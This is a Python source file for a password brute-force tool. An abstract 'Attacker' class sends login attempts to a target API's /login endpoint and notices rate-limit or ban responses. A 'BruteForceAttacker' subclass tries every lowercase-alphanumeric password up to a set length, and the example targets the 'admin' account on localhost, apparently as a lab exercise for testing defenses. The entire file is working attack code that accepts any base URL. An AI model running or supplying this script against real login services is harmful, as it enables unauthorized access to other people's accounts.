from abc import ABC, abstractmethod
import httpx
import itertools
import string
from typing import Optional


"""
Attacker class 
Abstract base class for all attacker types.
Handles all API communication for inherited attacker son class.
"""
class Attacker(ABC):
    
    def __init__(self, base_url: str):
        """
        Args:
            base_url: The base URL of the target API (e.g., "http://localhost:8000")
        """
        self.base_url = base_url.rstrip('/')
        self.login_endpoint = f"{self.base_url}/login"
        self.client = httpx.Client(timeout=10.0)
        self.attempts = 0
    
    

    def try_login(self, username: str, password: str) -> bool:
        """
        Args:
            username: The username
            password: The password to try
            
        Returns:
            True if login successful, False otherwise
            
        Raises:
            Exception: If the server blocks us or returns an error
        """
        try:
            response = self.client.post(
                self.login_endpoint,
                json={'username': username, 'password': password}
            )
            
            self.attempts += 1
            
            # Check if we're blocked
            if response.status_code == 429:  # Too Many Requests
                raise Exception("BLOCKED: Server returned 429 - Too Many Requests")
            
            if response.status_code == 403:  # Forbidden
                raise Exception("BLOCKED: Server returned 403 - Forbidden")
            
            # Check for block messages in response
            if response.status_code >= 400:
                try:
                    data = response.json()
                    message = data.get('detail', data.get('message', ''))
                    if 'block' in message.lower() or 'ban' in message.lower():
                        raise Exception(f"BLOCKED: {message}")
                except:
                    pass
            
            # Success indicators
            if response.status_code in [200, 201]:
                try:
                    data = response.json()
                    if 'access_token' in data or 'token' in data or data.get('success'):
                        return True
                except:
                    pass
            
            return False
            
        except httpx.RequestError as e:
            raise Exception(f"Network error: {e}")
    
    @abstractmethod
    def getPassword(self, username: str) -> Optional[str]:
        """
        Abstract method to attempt to obtain the password for a given username.
        
        Args:
            username: The target username
            
        Returns:
            The discovered password if successful, None otherwise
        """
        pass
    
    def close(self):
        self.client.close() # Close the HTTP client connection
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()


class BruteForceAttacker(Attacker):
    """
    Pure brute force attacker that tries all possible combinations.
    """
    
    def __init__(self, base_url: str, max_length: int = 4):
        """
        Args:
            base_url: The base URL of the target API
            max_length: Maximum password length to try
        """
        super().__init__(base_url)
        self.max_length = max_length
        self.chars = string.ascii_lowercase + string.digits
    
    def getPassword(self, username: str) -> Optional[str]:
        """
        Brute force attack to find the password.
        Tries all combinations: a, b, c, ..., aa, ab, ..., 0000, 0001, ...
        
        Args:
            username: The target username
            
        Returns:
            The discovered password if successful, None otherwise
        """
        print(f"Starting brute force attack on '{username}'")
        print(f"Character set: {self.chars}")
        print(f"Max length: {self.max_length}")
        print(f"Starting attack...\n")
        
        try:
            for length in range(1, self.max_length + 1):
                print(f"Trying length {length}...")
                
                for guess in itertools.product(self.chars, repeat=length):
                    guess_password = ''.join(guess)
                    
                    if self.try_login(username, guess_password):
                        print(f"\n✓ SUCCESS! Password found: '{guess_password}'")
                        print(f"Total attempts: {self.attempts}")
                        return guess_password
                    
                    # Progress indicator
                    if self.attempts % 100 == 0:
                        print(f"  Attempts: {self.attempts} | Current: '{guess_password}'")
        
        except Exception as e:
            print(f"\n Attack stopped: {e}")
            print(f"Total attempts before stop: {self.attempts}")
            return None
        
        print(f"\n Password not found after {self.attempts} attempts")
        return None


# Example usage
if __name__ == "__main__":
    # Create attacker
    with BruteForceAttacker(
        base_url="http://localhost:8000",
        max_length=4
    ) as attacker:
        
        # Try to crack password for username 'admin'
        password = attacker.getPassword('admin')
        
        if password:
            print(f"\nCracked! Username: admin, Password: {password}")
        else:
            print(f"\nFailed to crack password")